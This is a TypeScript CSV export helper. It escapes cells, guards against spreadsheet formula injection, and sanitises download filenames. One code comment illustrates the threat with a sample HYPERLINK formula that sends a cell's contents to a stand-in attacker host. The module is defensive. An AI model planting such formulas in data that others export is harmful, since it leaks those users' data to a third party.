/** Escape a single CSV cell. */
export const csvEscape = (v: unknown): string => {
  let s = v === null || v === undefined ? '' : String(v);
  // Formula injection guard: a cell starting with =, +, -, @, tab, or CR is
  // executed as a formula by Excel/Sheets on open (e.g. a free-text field
  // like =HYPERLINK("http://evil/steal?c="&A1,"View") entered by any user
  // whose data later gets exported). Prefixing with an apostrophe forces
  // spreadsheet apps to treat it as literal text.
  if (/^[=+\-@\t\r]/.test(s)) s = `'${s}`;
  if (/[",\n\r]/.test(s)) return `"${s.replace(/"/g, '""')}"`;
  return s;
};

/** Serialise an array of rows (2D) with a header row into CSV. */
export const toCsv = (header: string[], rows: unknown[][]): string => {
  return [header, ...rows]
    .map((r) => r.map(csvEscape).join(','))
    .join('\n');
};

/** Trigger a browser download of a CSV string. */
export const downloadCsv = (filename: string, csv: string): void => {
  const safe = filename.replace(/[^a-zA-Z0-9._-]+/g, '_');
  const blob = new Blob([csv], { type: 'text/csv;charset=utf-8;' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = safe.endsWith('.csv') ? safe : `${safe}.csv`;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
};
